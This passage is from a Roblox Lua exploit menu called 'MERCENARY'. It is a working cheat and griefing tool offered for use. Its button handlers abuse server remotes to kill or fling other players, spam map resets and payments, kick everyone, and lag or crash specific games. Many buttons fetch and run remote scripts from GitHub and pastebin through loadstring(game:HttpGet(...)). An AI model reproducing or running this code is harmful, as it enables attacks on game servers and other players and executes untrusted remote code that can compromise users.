                                game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("ShoveTool"):FireServer(v.Character.RightLowerLeg, Vector3.new(9e9, -9e9, -0.95))
                            end
                        end
                    end
                end)
            end)
        elseif btn.Name == "BTN14" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    task.spawn(function()
                        while true do
                            for _, v in ipairs(game.Players:GetPlayers()) do
                                if v.Name ~= player.Name and v.Character then
                                    local humanoid = v.Character:FindFirstChild("Humanoid")
                                    local root = v.Character:FindFirstChild("HumanoidRootPart")
                                    if humanoid and root then
                                        local args = { humanoid, root, 10, Vector3.new(0.99, 0.018, 0.11), 2, 0, false }
                                        game.Players.LocalPlayer.Character.Pistol.GunScript_Server.InflictTarget:FireServer(unpack(args))
                                    end
                                end
                            end
                            task.wait()
                        end
                    end)
                end)
            end)
        elseif btn.Name == "BTN15" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    pcall(function() local pp = CoreGui:FindFirstChild("PurchasePromptApp") if pp then pp:Destroy() end end)
                    pcall(function()
                        local pg = player:FindFirstChild("PlayerGui") or player.PlayerGui
                        if pg then
                            local mg = pg:FindFirstChild("MainGui")
                            if mg and mg:FindFirstChild("HoverSound") then mg.HoverSound.Volume = 0 end
                        end
                    end)
                    pcall(function() StarterGui:SetCore("SendNotification", { Title = "MERCENARY", Text = "NOOB ALL ON RESPAWN", Duration = 7 }) end)
                    for _, plr in ipairs(Players:GetPlayers()) do watchPlayer(plr) end
                    Players.PlayerAdded:Connect(watchPlayer)
                    local function clickBalloonAndApple(spamCount)
                        local balloon = Workspace:FindFirstChild("BillboardBalloon")
                        local apple = Workspace:FindFirstChild("BillboardApple")
                        local balloonClick = balloon and balloon:FindFirstChild("Board") and balloon.Board:FindFirstChildOfClass("ClickDetector")
                        local appleClick = apple and apple:FindFirstChild("Board") and apple.Board:FindFirstChildOfClass("ClickDetector")
                        if balloonClick then task.spawn(function() for i=1, (spamCount or 25000) do fireclickdetector(balloonClick) if i % 50 == 0 then task.wait() end end end) end
                        if appleClick then task.spawn(function() for i=1, (spamCount or 25000) do fireclickdetector(appleClick) if i % 50 == 0 then task.wait() end end end) end
                    end
                    clickBalloonAndApple(30000)
                end)
            end)
        elseif btn.Name == "BTN16" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/RTM.lua"))() end) end)
        elseif btn.Name == "BTN17" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/Kirsjw9euhs282828292nsdnsbsb.lua"))() end) end)
        elseif btn.Name == "BTN18" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/Jeei8wdjdndb9182dhdb1010wsbq.lua"))() end) end)
        elseif btn.Name == "BTN19" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/Haxxw99eidjjqw0eowwwkssj.lua"))() end) end)
        elseif btn.Name == "BTN20" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/Dodow9eidFindAy.lua"))() end) end)
        elseif btn.Name == "BTN21" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    local Event = game:GetService("ReplicatedStorage"):FindFirstChild("ResetMap")
                    if not Event then return end
                    task.spawn(function()
                        while true do
                            for i = 1, 50 do task.spawn(function() pcall(function() Event:FireServer() end) end) end
                            task.wait()
                        end
                    end)
                end)
            end)
        elseif btn.Name == "BTN22" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    RunService.RenderStepped:Connect(function()
                        local nums = {0.01, 0.05, 0.1, 0.25, 0.5, 1, 2, 5, 10, 20, 50}
                        for _, num in ipairs(nums) do
                            task.spawn(function()
                                local args = { workspace:WaitForChild("Resources"):WaitForChild("Building"):WaitForChild("CashierDesk"), num, "PutCash" }
                                game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Payment"):WaitForChild("OperatePaymentRE"):FireServer(unpack(args))
                            end)
                        end
                    end)
                end)
            end)
        elseif btn.Name == "BTN23" then
            btn.MouseButton1Click:Connect(function() pcall(function() kickAllWithRemote("DeleteCar") end) end)
        elseif btn.Name == "BTN24" then
            btn.MouseButton1Click:Connect(function() pcall(function() kickAllWithRemote("CloseFrameEvent") end) end)
        elseif btn.Name == "BTN25" then
            btn.MouseButton1Click:Connect(function() pcall(function() kickAllWithRemote("DestroyObj") end) end)
        elseif btn.Name == "BTN26" then
            btn.MouseButton1Click:Connect(function() pcall(function() kickAllWithRemote("NPCClean") end) end)
        elseif btn.Name == "BTN27" then
            btn.MouseButton1Click:Connect(function() pcall(function() kickAllWithRemote("DeleteCar") end) end)
        elseif btn.Name == "BTN28" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN29" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN30" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN31" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN32" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN33" then
            btn.MouseButton1Click:Connect(function() pcall(function() executeSnappleCMD() end) end)
        elseif btn.Name == "BTN34" then
            btn.MouseButton1Click:Connect(function() pcall(function() poppyPlaytime6Lag() end) end)
        elseif btn.Name == "BTN35" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/NmvXXxp6"))() end) end)
        elseif btn.Name == "BTN36" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/U9nWPEYd"))() end) end)
        elseif btn.Name == "BTN37" then
            btn.MouseButton1Click:Connect(function() pcall(function() brokenBonesIVLag() end) end)
        elseif btn.Name == "BTN38" then
            btn.MouseButton1Click:Connect(function() pcall(function() dogPoundLag() end) end)
        elseif btn.Name == "BTN39" then
            btn.MouseButton1Click:Connect(function() pcall(function() dominoEngineLag() end) end)
        elseif btn.Name == "BTN40" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/ACAR.lua"))() end) end)
        elseif btn.Name == "BTN41" then
            btn.MouseButton1Click:Connect(function() pcall(function() scpRoleplayLag() end) end)
        elseif btn.Name == "BTN42" then
            btn.MouseButton1Click:Connect(function() pcall(function() flagWarsLag() end) end)
        elseif btn.Name == "BTN43" then
            btn.MouseButton1Click:Connect(function() pcall(function() rocketRumbleLag() end) end)
        elseif btn.Name == "BTN44" then
            btn.MouseButton1Click:Connect(function() pcall(function() sprunki3DRPCrash() end) end)
        elseif btn.Name == "BTN45" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/Sr.lua"))() end) end)
        end
    end
end

local titleContainer = Instance.new("Frame")
titleContainer.Name = "TitleContainer"
titleContainer.Parent = Frame
titleContainer.BackgroundTransparency = 1
titleContainer.Position = UDim2.new(0.05, 0, 0.0005, 0)
titleContainer.Size = UDim2.new(0.7, 0, 0.06, 0)
titleContainer.ZIndex = 2

local titlePart1 = Instance.new("TextLabel")
titlePart1.Parent = titleContainer
titlePart1.BackgroundTransparency = 1
titlePart1.Position = UDim2.new(0, 0, 0, 0)
titlePart1.Size = UDim2.new(0, 115, 1, 0)
titlePart1.Font = Enum.Font.GothamBold
titlePart1.Text = "MERCENARY"
titlePart1.TextColor3 = ACCENT
titlePart1.TextSize = 19.6
titlePart1.ZIndex = 2
titlePart1.TextXAlignment = Enum.TextXAlignment.Left

local titlePart3 = Instance.new("TextLabel")
titlePart3.Parent = titleContainer
titlePart3.BackgroundTransparency = 1
titlePart3.Position = UDim2.new(0, 115, 0, 0)
titlePart3.Size = UDim2.new(0, 60, 1, 0)
titlePart3.Font = Enum.Font.GothamBold
titlePart3.Text = "1.9.0"
titlePart3.TextColor3 = TEXT_WHITE
titlePart3.TextSize = 19.6
titlePart3.ZIndex = 2
titlePart3.TextXAlignment = Enum.TextXAlignment.Left

local credit = Instance.new("TextLabel")
credit.Parent = Frame
credit.BackgroundTransparency = 1
credit.Position = UDim2.new(0.05, 0, 0.07, 0)
credit.Size = UDim2.new(0.7, 0, 0.034, 0)
credit.Font = Enum.Font.Gotham
credit.Text = "Snapple X Safari  //  MERCY"
credit.TextColor3 = TEXT_GRAY
credit.TextSize = 14
credit.ZIndex = 2
credit.TextXAlignment = Enum.TextXAlignment.Left

local navButtonRight = Instance.new("TextButton")
navButtonRight.Name = "NavRight"
navButtonRight.Parent = Frame
navButtonRight.BackgroundColor3 = NAV_BG
navButtonRight.BorderSizePixel = 0
navButtonRight.Position = UDim2.new(0.90, 0, 0.005, 0)
navButtonRight.Size = UDim2.new(0, 25, 0, 25)
navButtonRight.Font = Enum.Font.GothamBold
navButtonRight.Text = ">"
navButtonRight.TextColor3 = ACCENT
navButtonRight.TextSize = 14
navButtonRight.ZIndex = 2

local navButtonLeft = Instance.new("TextButton")
navButtonLeft.Name = "NavLeft"
navButtonLeft.Parent = Frame
navButtonLeft.BackgroundColor3 = NAV_BG
navButtonLeft.BorderSizePixel = 0
navButtonLeft.Position = UDim2.new(0.80, 0, 0.005, 0)
navButtonLeft.Size = UDim2.new(0, 25, 0, 25)
navButtonLeft.Font = Enum.Font.GothamBold
navButtonLeft.Text = "<"
navButtonLeft.TextColor3 = ACCENT
navButtonLeft.TextSize = 14
navButtonLeft.ZIndex = 2
navButtonLeft.Visible = false

local navButtonMin = Instance.new("TextButton")
navButtonMin.Name = "NavMin"
navButtonMin.Parent = Frame
navButtonMin.BackgroundColor3 = NAV_BG
navButtonMin.BorderSizePixel = 0
navButtonMin.Position = UDim2.new(0.70, 0, 0.005, 0)
navButtonMin.Size = UDim2.new(0, 25, 0, 25)
navButtonMin.Font = Enum.Font.GothamBold
navButtonMin.Text = "-"
navButtonMin.TextColor3 = ACCENT
navButtonMin.TextSize = 14
navButtonMin.ZIndex = 2

local tabIndicator = Instance.new("TextLabel")
tabIndicator.Parent = Frame
tabIndicator.BackgroundTransparency = 1
tabIndicator.Position = UDim2.new(0.80, 0, 0.065, 0)
tabIndicator.Size = UDim2.new(0, 50, 0, 20)
tabIndicator.Font = Enum.Font.GothamBold
tabIndicator.Text = "1/4"
tabIndicator.TextColor3 = TAB_INDICATOR_COLOR
tabIndicator.TextSize = 12
tabIndicator.ZIndex = 2
tabIndicator.TextXAlignment = Enum.TextXAlignment.Center

navButtonRight.MouseButton1Click:Connect(function()
    if currentTab < totalTabs then
        currentTab = currentTab + 1
        loadTab(currentTab)
        tabIndicator.Text = currentTab .. "/" .. totalTabs
        if currentTab > 1 then navButtonLeft.Visible = true end
        if currentTab == totalTabs then navButtonRight.Visible = false end
    end
end)

navButtonLeft.MouseButton1Click:Connect(function()
    if currentTab > 1 then
        currentTab = currentTab - 1
        loadTab(currentTab)
        tabIndicator.Text = currentTab .. "/" .. totalTabs
        if currentTab < totalTabs then navButtonRight.Visible = true end
        if currentTab == 1 then navButtonLeft.Visible = false end
    end
end)

navButtonRight.MouseEnter:Connect(function() ts:Create(navButtonRight, TweenInfo.new(0.12), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonRight.MouseButton1Down:Connect(function() ts:Create(navButtonRight, TweenInfo.new(0.07), {BackgroundColor3 = NAV_PRESS}):Play() playClickSound() end)
navButtonRight.MouseButton1Up:Connect(function() ts:Create(navButtonRight, TweenInfo.new(0.09), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonRight.MouseLeave:Connect(function() ts:Create(navButtonRight, TweenInfo.new(0.12), {BackgroundColor3 = NAV_BG}):Play() end)

navButtonLeft.MouseEnter:Connect(function() ts:Create(navButtonLeft, TweenInfo.new(0.12), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonLeft.MouseButton1Down:Connect(function() ts:Create(navButtonLeft, TweenInfo.new(0.07), {BackgroundColor3 = NAV_PRESS}):Play() playClickSound() end)
navButtonLeft.MouseButton1Up:Connect(function() ts:Create(navButtonLeft, TweenInfo.new(0.09), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonLeft.MouseLeave:Connect(function() ts:Create(navButtonLeft, TweenInfo.new(0.12), {BackgroundColor3 = NAV_BG}):Play() end)

navButtonMin.MouseEnter:Connect(function() ts:Create(navButtonMin, TweenInfo.new(0.12), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonMin.MouseButton1Down:Connect(function() ts:Create(navButtonMin, TweenInfo.new(0.07), {BackgroundColor3 = NAV_PRESS}):Play() playClickSound() end)
navButtonMin.MouseButton1Up:Connect(function() ts:Create(navButtonMin, TweenInfo.new(0.09), {BackgroundColor3 = NAV_HOVER}):Play() end)
navButtonMin.MouseLeave:Connect(function() ts:Create(navButtonMin, TweenInfo.new(0.12), {BackgroundColor3 = NAV_BG}):Play() end)

local iconGui = nil

local function createMinimizedIcon()
    if iconGui then return end

    iconGui = Instance.new("ScreenGui")
    iconGui.Name = "MercenaryIcon"
    iconGui.Parent = guiParent
    iconGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    iconGui.IgnoreGuiInset = true

    local iconButton = Instance.new("ImageButton")
    iconButton.Name = "MercenaryIconButton"
    iconButton.Parent = iconGui
    iconButton.BackgroundColor3 = FRAME_BG
    iconButton.BorderSizePixel = 0
    iconButton.Position = UDim2.new(0.05, 0, 0.4, 0)
    iconButton.Size = UDim2.new(0, 50, 0, 50)
    iconButton.Image = "rbxassetid://115242982447906"
    iconButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
    iconButton.ScaleType = Enum.ScaleType.Crop
    iconButton.AutoButtonColor = false
    iconButton.ZIndex = 2

    local iconCorner = Instance.new("UICorner")
    iconCorner.CornerRadius = UDim.new(1, 0)
    iconCorner.Parent = iconButton

    local iconStroke = Instance.new("UIStroke")
    iconStroke.Color = ACCENT
    iconStroke.Thickness = 2
    iconStroke.Parent = iconButton

    local dragging, dragInput, dragStart, startPos

    local function updateIconDrag(input)
        local delta = input.Position - dragStart
        iconButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    iconButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = iconButton.Position
            dragInput = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    iconButton.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            updateIconDrag(input)
        end
    end)

    iconButton.MouseEnter:Connect(function()
        ts:Create(iconButton, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_HOVER}):Play()
    end)
    iconButton.MouseLeave:Connect(function()
        ts:Create(iconButton, TweenInfo.new(0.12), {BackgroundColor3 = FRAME_BG}):Play()
    end)

    local wasDragged = false
    iconButton.MouseButton1Down:Connect(function()
        wasDragged = false
    end)
    iconButton.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            wasDragged = true
        end
        if dragging and input.UserInputType == Enum.UserInputType.Touch then
            wasDragged = true
        end
    end)

    iconButton.MouseButton1Click:Connect(function()
        if wasDragged then
            wasDragged = false
            return
        end
        playClickSound()
        Frame.Visible = true
        if iconGui then
            iconGui:Destroy()
            iconGui = nil
        end
    end)
end

navButtonMin.MouseButton1Click:Connect(function()
    playClickSound()
    Frame.Visible = false
    createMinimizedIcon()
end)

loadTab(1)

print("MERCENARY initiliazed boyiii")
